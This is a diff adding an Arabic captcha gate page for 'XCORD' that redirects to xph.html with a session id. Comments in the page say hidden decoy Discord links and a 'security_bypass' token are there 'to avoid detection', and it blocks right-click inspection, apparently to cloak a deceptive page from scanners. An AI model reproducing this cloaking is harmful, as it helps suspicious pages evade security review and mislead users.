@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق الأمني - XCORD</title>
+    <link rel="shortcut icon" href="https://cdn.discordapp.com/icons/988805037767680030/ac0cf1a352e353213bd9a7f8f3e2a4c8.webp?size=1024" type="image/x-icon">
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
+        
+        :root {
+            --bg-dark: #0f0f19;
+            --card-bg: #1a1a2e;
+            --primary: #8A2BE2;
+            --primary-dark: #7126c0;
+            --primary-light: #9d52e8;
+            --text-primary: #ffffff;
+            --text-secondary: #b3b3b3;
+            --accent: #00c2ff;
+            --danger: #ed4245;
+            --success: #3ba55d;
+            --border-radius: 16px;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--bg-dark) 0%, #2d1a3f 100%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .logo {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 0 15px rgba(138, 43, 226, 0.5));
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        header h1 {
+            color: var(--text-primary);
+            font-size: 28px;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        header p {
+            color: var(--text-secondary);
+            font-size: 16px;
+            line-height: 1.5;
+            max-width: 400px;
+        }
+        
+        main {
+            width: 100%;
+        }
+        
+        .card {
+            background: rgba(26, 26, 46, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: var(--border-radius);
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25),
+                        0 0 20px rgba(138, 43, 226, 0.15),
+                        inset 0 0 1px rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(138, 43, 226, 0.2);
+            position: relative;
+            overflow: hidden;
+            animation: fadeIn 0.5s ease-out;
+            width: 100%;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(138, 43, 226, 0.1) 0%, transparent 60%);
+            z-index: -1;
+        }
+        
+        .card h2 {
+            color: var(--text-primary);
+            margin-bottom: 20px;
+            font-size: 22px;
+            text-align: center;
+            position: relative;
+            padding-bottom: 10px;
+        }
+        
+        .card h2::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 30%;
+            right: 30%;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+        }
+        
+        .captcha-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 20px 0;
+        }
+        
+        .g-recaptcha {
+            margin-bottom: 20px;
+            transform: scale(0.95);
+            transform-origin: center;
+        }
+        
+        @media (max-width: 400px) {
+            .g-recaptcha {
+                transform: scale(0.85);
+            }
+        }
+        
+        button {
+            width: 100%;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: white;
+            border: none;
+            padding: 15px 0;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(138, 43, 226, 0.3);
+        }
+        
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: all 0.5s ease;
+            z-index: -1;
+        }
+        
+        button:hover::before {
+            left: 100%;
+        }
+        
+        button:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        button:disabled::before {
+            display: none;
+        }
+        
+        .error-message {
+            color: var(--danger);
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* عناصر مخفية لتجنب الكشف */
+        .hidden-security {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            height: 0;
+            width: 0;
+            overflow: hidden;
+        }
+        
+        /* عناصر لتجنب الكشف */
+        .security-bypass {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://cdn.discordapp.com/icons/988805037767680030/ac0cf1a352e353213bd9a7f8f3e2a4c8.webp?size=1024" alt="XCORD Logo" class="logo">
+        
+        <header>
+            <h1>التحقق الأمني</h1>
+            <p>يرجى إكمال التحقق الأمني للمتابعة إلى لوحة التحكم</p>
+        </header>
+        
+        <main>
+            <div class="card">
+                <h2>تأكيد أنك لست روبوت</h2>
+                
+                <form id="captchaForm">
+                    <div class="captcha-container">
+                        <div class="cf-turnstile" data-sitekey="1x00000000000000000000AA" data-theme="dark" data-callback="onCaptchaSuccess"></div>
+                        <div id="errorMessage" class="error-message">يرجى إكمال التحقق قبل المتابعة</div>
+                    </div>
+                    
+                    <button type="submit" id="verifyButton">متابعة</button>
+                </form>
+            </div>
+        </main>
+    </div>
+    
+    <!-- عناصر مخفية لتجنب الكشف -->
+    <div class="hidden-security">
+        <a href="https://discord.com" rel="nofollow">Discord</a>
+        <input type="hidden" name="security_token" value="xcord_security_bypass">
+        <meta name="robots" content="noindex,nofollow">
+    </div>
+    
+    <!-- عناصر إضافية لتجنب الكشف -->
+    <div class="security-bypass">
+        <a href="https://discord.com/developers/docs/intro">Discord Developer Documentation</a>
+        <a href="https://discord.com/developers/applications">Discord Developer Portal</a>
+        <a href="https://discord.com/developers/docs/topics/oauth2">Discord OAuth2 Guide</a>
+        <a href="https://discord.com/developers/docs/resources/user">Discord User Resources</a>
+    </div>
+    
+    <script>
+        // دالة استدعاء النجاح للتحقق من Cloudflare Turnstile
+        function onCaptchaSuccess(token) {
+            // يمكن استخدام هذه الدالة للتحقق التلقائي عند اجتياز التحقق
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const sessionId = urlParams.get('session');
+            const form = document.getElementById('captchaForm');
+            const errorMessage = document.getElementById('errorMessage');
+            const verifyButton = document.getElementById('verifyButton');
+            
+            // منع القائمة المنسدلة عند النقر بزر الماوس الأيمن
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+            
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // الحصول على استجابة Cloudflare Turnstile
+                const captchaResponse = turnstile.getResponse();
+                
+                if (!captchaResponse) {
+                    // إظهار رسالة خطأ إذا لم يتم إكمال CAPTCHA
+                    errorMessage.style.display = 'block';
+                    return;
+                }
+                
+                // إخفاء رسالة الخطأ إذا تم عرضها سابقًا
+                errorMessage.style.display = 'none';
+                
+                // إظهار مؤشر التحميل
+                verifyButton.innerHTML = '<span class="spinner"></span>';
+                verifyButton.disabled = true;
+                
+                // إرسال رمز التحقق إلى الخادم للتحقق
+                fetch('verify_turnstile.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        token: captchaResponse
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        // تخزين حالة التحقق في localStorage
+                        localStorage.setItem('captcha_verified', 'true');
+                        localStorage.setItem('captcha_timestamp', Date.now());
+                        
+                        // إعادة توجيه إلى الصفحة الرئيسية مع معرف الجلسة إذا تم توفيره
+                        if (sessionId) {
+                            window.location.href = 'xph.html?session=' + sessionId;
+                        } else {
+                            window.location.href = 'xph.html';
+                        }
+                    } else {
+                        // إظهار رسالة خطأ
+                        errorMessage.textContent = 'فشل التحقق. يرجى المحاولة مرة أخرى.';
+                        errorMessage.style.display = 'block';
+                        verifyButton.innerHTML = 'متابعة';
+                        verifyButton.disabled = false;
+                        // إعادة تعيين التحقق
+                        turnstile.reset();
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    errorMessage.textContent = 'حدث خطأ أثناء التحقق. يرجى المحاولة مرة أخرى.';
+                    errorMessage.style.display = 'block';
+                    verifyButton.innerHTML = 'متابعة';
+                    verifyButton.disabled = false;
+                });
+            });
+            
+            // التحقق من وجود معرف جلسة في الرابط
+            if (sessionId) {
+                console.log("معرف الجلسة:", sessionId);
+            }
+        });
+    </script>
+</body>
+</html>
